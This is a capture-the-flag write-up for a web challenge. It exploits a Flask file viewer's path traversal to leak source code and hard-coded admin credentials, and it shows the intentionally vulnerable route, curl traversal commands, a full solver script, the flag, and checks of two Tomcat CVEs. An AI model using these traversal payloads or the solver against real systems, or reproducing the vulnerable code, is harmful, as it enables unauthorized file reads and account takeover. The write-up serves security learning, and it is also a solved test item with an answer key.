---
title: "Tomcat Path Traversal"
ctf: "Safaricom CTF"
date: 2026-10-06
category: web
difficulty: medium
points: 450
flag_format: "safctf{...}"
author: "Strawhats"
---

# Tomcat Path Traversal

> **Category:** WEB · **Points:** 450 · **Difficulty:** medium

## Discovery, analysis & exploitation

The full hunt below is reproduced from our working notes — recon, fingerprinting, the bug, dead ends, and the path to the flag.

- **Targets:**
  - FRONT `http://54.72.82.22:8150` — waitress/Flask, page title **BACKLOT 77**
  - BACK  `http://54.72.82.22:8240` — bare Apache Tomcat/9.0.122

## Target map

### FRONT :8150 — waitress/Flask "PwnZone File Viewer"

The landing page (`BACKLOT 77` theme) is a file viewer whose JS calls
`GET /view?file=<path>`. Server header: `waitress`. Only three routes exist —
`/`, `/view`, `/admin` (everything else is a Flask 404). `/admin` returns
`401` with `WWW-Authenticate: Basic realm="CTF Admin Portal"`.

`/view` is a straight path traversal:

```python
@app.route("/view")
def view_file():
    rel_path = request.args.get("file", "").strip()
    target_path = os.path.abspath(os.path.join(BASE_DIR, rel_path))
    # Intentionally vulnerable: naive check removed (for CTF)
    try:
        return send_file(target_path)
    except Exception as e:
        if os.path.isabs(rel_path) and os.path.exists(rel_path):
            return send_file(rel_path)
        return f"Error: {e}", 404
```

`BASE_DIR = /app/public`, so `file=../../../../etc/passwd` reads `/etc/passwd`,
and an absolute `file=/app/app.py` also works via the fallback branch.
(`/proc/*` files come back empty/500 because `send_file` uses their stat size,
which is 0 for procfs.)

### BACK :8240 — Tomcat 9.0.122

Header on every response is the stock Tomcat 404 page (`Apache Tomcat/9.0.122`).
**No webapps are deployed**: `/`, `/ROOT/`, `/manager/html`, `/docs/`,
`/examples/`, `/host-manager/html` and ~40 context/file guesses all return
`404`. `GET/PUT/OPTIONS/TRACE` all `404`.

## The bug

The traversal in `/view` reaches `/app/app.py`, which hard-codes the admin
credentials:

```python
ADMIN_USER = "panel_admin"
ADMIN_PASS = "k1tsune_2025!"
FLAG1 = os.getenv('FLAG')

@app.route("/admin")
@requires_auth
def admin_panel():
    return f"<h2>Admin Panel</h2><p>Nice work. Here's your flag: <strong>{FLAG1}</strong></p>"
```

So the chain is **path traversal → source disclosure → hard-coded Basic-auth
creds → `/admin` → `FLAG` env var**.

## Exploit

```sh
# 1. read the source through the traversal
curl 'http://54.72.82.22:8150/view?file=../app.py'      # or file=/app/app.py

# 2. use the creds from the source against /admin
curl -u 'panel_admin:k1tsune_2025!' http://54.72.82.22:8150/admin
# -> safctf{e9e46fabe7b282f4eb4eff39b378eff3}
```

`solve.py` automates this: it reads `../app.py`, regex-extracts
`ADMIN_USER`/`ADMIN_PASS`, then GETs `/admin` with HTTP Basic and prints the

## Tomcat / CVE-2024-50379 / CVE-2025-24813 — verified NOT the path

The triage hint suggested the case-insensitive path-handling /
partial-PUT class. Both were checked and ruled out on this deployment:

- **CVE-2024-50379** (case-insensitive path confusion) is a **Windows-only**
  filesystem issue; the backend is Linux (`/etc/hosts` of the sibling front
  container shows a Docker bridge `172.16.x`), and `/INDEX.JSP` vs `/index.jsp`
  behave identically (`404` both).
- **CVE-2025-24813** (partial PUT → write / deserialization) needs the default
  servlet with `readonly=false`. Every `PUT` (plain, `Content-Range` partial,
  with/without a context path) returns `404`, i.e. writes are disabled — the
  classic "not exploitable" response.
- Encoded path traversal against Tomcat's default servlet is rejected:
  `/..%2f..%2fflag.txt`, `/%2e%2e%2f...`, `/..%5c...` all return `400`
  (Coyote rejects encoded slashes); `..%252f` double-encoding returns `404`.
  `;`-path-parameter tricks (`/..;/..;/`) return `400`/`404`.
- Version `9.0.122` is well past both CVEs' fix lines anyway.

Conclusion: the Tomcat backend is a bare, read-only, empty instance — the
"Tomcat" in the challenge name is the scenario flavour; the actual,
reproducible path to the flag is the front-end `/view` traversal.

## Solve script

`web/tomcat-path-traversal/solve.py`:

```python
#!/usr/bin/env python3
"""Solver for "Tomcat Path Traversal" (web, 450 pts).

Targets
-------
  FRONT : http://54.72.82.22:8150   waitress/Flask app "BACKLOT 77"
                                     -> "PwnZone File Viewer" (/view?file=)
  BACK  : http://54.72.82.22:8240   bare Apache Tomcat/9.0.122

Chain
-----
  /view?file=  is a raw path-traversal file read:
      target_path = os.path.abspath(os.path.join(BASE_DIR, rel_path))
      return send_file(target_path)          # BASE_DIR = /app/public
  plus an absolute-path fallback, so ../app.py or /app/app.py both read the
  Flask source. The source leaks the hard-coded admin credentials. With them,
  GET /admin (HTTP Basic) returns the flag from the FLAG env var.

Usage
-----
  python3 solve.py [front_url] [backend_url]
"""

import re
import sys

import requests

FRONT = sys.argv[1] if len(sys.argv) > 1 else "http://54.72.82.22:8150"
BACK = sys.argv[2] if len(sys.argv) > 2 else "http://54.72.82.22:8240"

FLAG_RE = re.compile(r"safctf\{[0-9a-f]{32}\}")


def show(msg):
    print(msg, flush=True)


def read_file(base, path):
    """Path-traversal file read against /view?file=."""
    r = requests.get(base + "/view", params={"file": path}, timeout=15)
    if r.status_code == 200:
        return r.text
    return None


def main():
    s = requests.Session()

    # 1. Leak the Flask source via the traversal (both relative and absolute
    #    forms are accepted by the app).
    src = None
    for path in ("../app.py", "/app/app.py", "..%2fapp.py"):
        src = read_file(FRONT, path)
        if src and "ADMIN_USER" in src:
            show(f"[+] leaked source via file={path!r}")
            break
    if not src:
        show("[-] could not read app.py through the traversal")
        src = ""

    # If the source was not reachable, fall back to the credentials that are
    # baked into the image (documented in NOTES.md).
    m_user = re.search(r'ADMIN_USER\s*=\s*"([^"]+)"', src or "")
    m_pass = re.search(r'ADMIN_PASS\s*=\s*"([^"]+)"', src or "")
    user = m_user.group(1) if m_user else "panel_admin"
    pw = m_pass.group(1) if m_pass else "k1tsune_2025!"
    show(f"[+] admin credentials: {user}:{pw}")

    # 2. Authenticate to /admin and read the flag.
    r = s.get(FRONT + "/admin", auth=(user, pw), timeout=15)
    body = r.text
    show(f"[+] GET /admin -> {r.status_code}")
    found = FLAG_RE.search(body)
    if found:
        show("[+] FLAG: " + found.group(0))
    else:
        show("[-] no flag in /admin response:")
        show(body[:400])

    # 3. Best-effort: check whether any flag is exposed straight through the
    #    traversal as well (some deployments also drop a flag file).
    for path in ("/flag.txt", "/flag", "/app/flag.txt"):
        data = read_file(FRONT, path)
        if data:
            fm = FLAG_RE.search(data)
            show(f"[i] {path} -> {fm.group(0) if fm else data.strip()[:80]!r}")

    # 4. Note the Tomcat backend state (read-only reference for the writeup).
    try:
        r = requests.put(BACK + "/probe.txt", data="x", timeout=10)
        show(f"[i] backend PUT /probe.txt -> {r.status_code} "
             f"(404 == default servlet read-only, CVE-2025-24813 not exploitable)")
    except Exception as e:  # noqa: BLE001
        show(f"[i] backend unreachable: {e}")


if __name__ == "__main__":
    main()
```

## Tools

**Used in this solve:**

- Python `requests` (HTTP client)
- Python 3 (solver)
- curl

**Other tools that fit this category:**

- Burp Suite / mitmproxy (intercept + repeat)
- ffuf / feroxbuster (content & parameter discovery)
- sqlmap (automated SQLi)
- tplmap (SSTI)
- jwt_tool (JWT attacks)
- nikto
- nuclei

## Flag

```
safctf{e9e46fabe7b282f4eb4eff39b378eff3}
```
